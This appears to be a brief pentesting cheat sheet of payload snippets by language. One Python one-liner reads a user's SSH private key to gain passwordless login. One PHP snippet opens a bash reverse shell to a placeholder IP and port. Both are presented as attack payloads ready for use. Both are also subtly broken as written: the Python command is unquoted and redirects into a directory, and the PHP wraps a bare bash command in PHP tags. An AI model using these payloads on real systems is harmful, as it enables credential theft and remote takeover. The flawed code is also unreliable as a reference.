## Python
- `import os; os.system({BASH COMMAND})` ex. from [[Share - Writeup]] `import os; os.system(cat ~/.ssh/id_rsa > /tmp)` this command was used in order to get the id_rsa of the user running the process in order to enter to the user via ssh with no password

## PHP
- `<?php bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' ?>` - Basic PHP reverse shell